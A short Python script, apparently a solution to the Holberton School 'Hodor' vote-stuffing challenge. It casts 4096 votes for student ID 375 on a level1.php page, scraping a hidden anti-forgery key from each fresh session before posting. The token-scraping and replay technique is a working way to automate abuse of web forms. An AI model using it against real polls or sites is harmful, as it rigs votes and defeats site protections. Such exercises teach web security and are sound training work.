#!/usr/bin/python3
# 4096.py
# Brennan D Baraban <375@holbertonschool.com>
"""Hodor with my Holberton ID 4096 times."""
import requests
from bs4 import BeautifulSoup

php = "http://158.69.76.135/level1.php"
vote = {
    "id": "375",
    "holdthedoor": "holdthedoor",
    "key": ""
}

for i in range(0, 4096):
    session = requests.session()
    page = session.get(php)
    soup = BeautifulSoup(page.text, "html.parser")
    hidden_value = str(soup.find_all(type="hidden"))
    hidden_value = hidden_value.split()[3]
    vote["key"] = hidden_value[7:-4]
    session.post(php, data=vote)
